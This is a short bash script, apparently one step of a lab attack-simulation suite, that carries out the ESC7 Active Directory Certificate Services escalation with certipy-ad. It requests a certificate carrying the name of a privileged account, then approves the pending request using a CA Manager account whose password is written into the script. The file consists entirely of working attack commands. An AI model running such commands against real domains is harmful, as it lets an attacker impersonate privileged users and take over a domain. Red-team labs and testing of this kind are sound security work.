#!/bin/bash
# CONFIGURED—lead_engineering has ManageCA+Issue on cadre-CA
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "055" "ESC7 — CA Manager approval bypass + request approval"

require_tool certipy-ad

log "Step 1: Request certificate (will be pending approval)"
run_cmd "certipy-ad req -ca $CA_NAME -template User -upn chief_command@$DOMAIN_ROOT -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC7 — initial request (pending)"

log "Step 2: Approve pending request as lead_engineering (CA Manager)"
run_cmd "certipy-ad ca -ca $CA_NAME -approve -u lead_engineering@$DOMAIN_ROOT -p 'Eng_L3ad!' -dc-ip $DC01"
result $? "ESC7 — approval"
